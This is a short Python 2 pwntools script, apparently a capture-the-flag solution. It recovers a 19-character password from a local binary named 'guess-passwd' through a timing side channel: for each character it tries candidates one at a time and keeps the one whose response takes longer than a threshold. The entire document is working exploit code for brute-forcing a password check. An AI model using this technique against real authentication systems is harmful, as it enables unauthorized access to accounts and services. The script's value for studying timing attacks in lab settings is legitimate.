import time
from pwn import *
import sys
import os



passwd = [0] * 19

def pa():
    return str(passwd)[1:-1].replace("\'", "").replace(", ", "")

context.log_level = 'error'
t1 = time.time()
t2 = time.time()
time_diff = t2 - t1
chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
for j in range(19):
    for i in chars:
        passwd[j] = i
        p = process("./guess-passwd")
        time.sleep(.085)
        p.recv()
        p.sendline(pa())
        t1 = time.time()
        data = p.recv()
        t2 = time.time()
        time_diff = t2 - t1
        print time_diff
        if time_diff > .02 * (j+1):
            p.close()
            break
        p.close()
print pa()
